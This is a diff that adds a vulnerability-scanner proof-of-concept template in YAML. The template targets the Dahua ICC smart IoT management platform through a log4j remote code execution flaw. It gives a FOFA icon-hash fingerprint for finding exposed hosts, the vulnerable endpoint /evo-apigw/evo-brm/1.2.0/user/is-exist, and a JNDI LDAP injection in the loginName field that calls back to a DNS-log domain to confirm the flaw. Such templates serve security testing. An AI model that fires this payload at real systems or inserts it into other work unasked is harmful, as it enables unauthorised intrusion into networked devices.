@@ -1,0 +1,20 @@
+id: poc-yaml-dahua-icc-user-is-exist-log4j-rce
+info:
+  name: 大华ICC智能物联综合管理平台 log4j远程代码执行
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: 大华ICC智能物联综合管理平台
+  fofa: icon_hash="-1935899595"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /evo-apigw/evo-brm/1.2.0/user/is-exist
+  headers:
+    Content-Type: application/json;charset=utf-8
+  data: '{ "loginName":"${jndi:ldap://{{.reverseDomain}}}" }'
+  expression: reverse.Verify()
+transport: http
